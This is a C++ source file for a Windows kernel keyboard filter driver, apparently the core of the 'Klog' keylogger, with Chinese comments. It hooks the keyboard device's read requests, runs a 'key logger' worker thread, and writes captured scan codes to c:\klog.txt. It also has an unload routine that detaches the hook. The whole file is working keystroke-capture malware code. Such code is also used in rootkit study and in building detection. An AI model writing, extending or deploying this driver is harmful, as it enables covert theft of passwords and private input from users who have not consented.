extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdHook.h"
#include "KbdLog.h"
#include "ScanCode.h"

int numPendingIrps = 0;

//  DriverEntry

// 中断请求等级为 passive
extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
{
	NTSTATUS Status = {0};

	DbgPrint("Keyboard Filter Driver - DriverEntry\n");

	for(int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DispatchPassDown;
	DbgPrint("Filled dispatch table with generic pass down routine...\n");

	//明确构筑的设备
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	//勾住键盘
	HookKeyboard(pDriverObject);
	DbgPrint("Hooked IRP_MJ_READ routine...\n");

	// 设置工作线程控制文件对扫描值的写操作
	InitThreadKeyLogger(pDriverObject);

	//初始化键值获取与队列的连接
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	//初始化队列锁
	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);

	//初始化工作队列变量
	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0 , MAXLONG);

	//创建日志文件
	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
    STRING		 ntNameString;
	UNICODE_STRING uFileName;
    RtlInitAnsiString( &ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE );
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile,GENERIC_WRITE,&obj_attrib,&file_status,
							NULL,FILE_ATTRIBUTE_NORMAL,0,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
	RtlFreeUnicodeString(&uFileName);

	if (Status != STATUS_SUCCESS)
	{
		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n",file_status);
	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n",pKeyboardDeviceExtension->hLogFile);
	}

	//设置驱动卸载过程
	pDriverObject->DriverUnload = Unload;
	DbgPrint("Set DriverUnload function pointer...\n");
	DbgPrint("Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}

// 中断请求等级为 passive
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp )
{
	DbgPrint("Entering DispatchPassDown Routine...\n");
	//将irp传递给目标
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);
}//DriverDispatcher


// 中断请求等级为 passive
VOID Unload( IN PDRIVER_OBJECT pDriverObject)
{
	//获取设备扩展的指针
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	DbgPrint("Driver Unload Called...\n");

	//释放被绑定的设备
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	DbgPrint("Keyboard hook detached from device...\n");

	//在设备移除前等待标记了的IRPs
	DbgPrint("There are %d tagged IRPs\n",numPendingIrps);
	DbgPrint("Waiting for tagged IRPs to die...\n");

	//Create a timer 建立计时器
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	timeout.QuadPart = 1000000; //0.1 秒
	KeInitializeTimer(&kTimer);

	while(numPendingIrps > 0)
	{
		//设置时间
		KeSetTimer(&kTimer,timeout,NULL);
		KeWaitForSingleObject(&kTimer,Executive,KernelMode,false ,NULL);
	}

	//将记录的工作线程置为终止状态
	pKeyboardDeviceExtension ->bThreadTerminate = true;

	//唤醒线程
	KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,TRUE);

	//等待工作进程终止
	DbgPrint("Waiting for key logger thread to terminate...\n");
	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj,
			Executive,KernelMode,false,NULL);
	DbgPrint("Key logger thread termintated\n");

	//关闭记录文件
	ZwClose(pKeyboardDeviceExtension->hLogFile);

	//卸载设备
	IoDeleteDevice(pDriverObject->DeviceObject);
	DbgPrint("Tagged IRPs dead...Terminating...\n");

	return;
}

